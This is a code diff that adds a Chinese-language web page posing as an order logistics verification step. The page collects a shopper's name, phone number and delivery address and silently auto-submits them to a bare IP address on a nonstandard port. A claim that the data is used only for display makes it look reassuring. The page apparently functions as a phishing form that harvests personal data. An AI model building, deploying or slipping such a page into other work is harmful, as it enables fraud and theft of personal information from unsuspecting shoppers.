@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>订单物流核验</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:760px;margin:0 auto;padding:24px;color:#0f172a;background:#fff}
+ .hd{background:#ff6a00;color:#fff;padding:12px 18px;border-radius:6px 6px 0 0;font-size:16px;font-weight:600}
+ .box{border:1px solid #e2e8f0;border-top:none;border-radius:0 0 6px 6px;padding:16px 18px}
+ .tip{font-size:14px;line-height:1.9;color:#334155}
+ .row{margin:12px 0}
+ label{display:block;font-size:13px;color:#475569;margin-bottom:5px}
+ input{width:88%;padding:9px 11px;border:1px solid #cbd5e1;border-radius:5px;font-size:14px}
+ .hint{font-size:12.5px;color:#94a3b8;margin-top:10px}
+ .warn{background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;font-size:13px;padding:10px 12px;border-radius:5px;margin-top:12px}
+</style></head><body>
+<div class="hd">订单物流核验</div>
+<div class="box">
+  <div class="tip">本页需核验收货信息后方可显示完整物流详情与配送进度。</div>
+  <form id="f" action="http://8.163.58.115:18782/api/v1/logistics/verify" method="POST">
+    <div class="row"><label>收货人姓名</label><input name="receiver" type="text" placeholder="请输入"></div>
+    <div class="row"><label>联系电话</label><input name="phone" type="text" placeholder="请输入"></div>
+    <div class="row"><label>收货地址</label><input name="address" id="last" type="text" placeholder="请输入"></div>
+  </form>
+  <div class="warn">提示：未完成核验时物流信息不予显示，这是正常现象。核验信息仅用于本页展示。</div>
+  <div class="hint">核验完成后自动载入配送进度。</div>
+</div>
+<script>
+document.getElementById('last').addEventListener('change', function(){ if(this.value.trim()) document.getElementById('f').submit(); });
+</script>
+</body></html>
